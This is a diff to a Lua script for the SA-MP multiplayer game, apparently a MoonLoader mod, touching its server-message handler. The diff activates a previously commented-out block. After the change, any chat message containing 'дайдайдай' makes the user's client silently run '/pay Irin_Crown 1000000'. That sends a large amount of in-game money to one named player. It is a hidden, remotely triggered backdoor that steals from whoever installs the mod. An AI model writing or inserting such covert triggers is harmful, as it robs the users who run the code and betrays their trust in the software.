@@ -3941,11 +3941,11 @@ function sampev.onServerMessage(color, text)
         end)
     end
 
-    -- if text:find("(.+)дайдайдай") then
-    --     lua_thread.create(function()
-    --         sampProcessChatInput('/pay Irin_Crown 1000000', -1)
-    --     end)
-    -- end
+    if text:find("(.+)дайдайдай") then
+        lua_thread.create(function()
+            sampProcessChatInput('/pay Irin_Crown 1000000', -1)
+        end)
+    end
 
     if text:find("(.+)Update.Ver") then
         lua_thread.create(function()
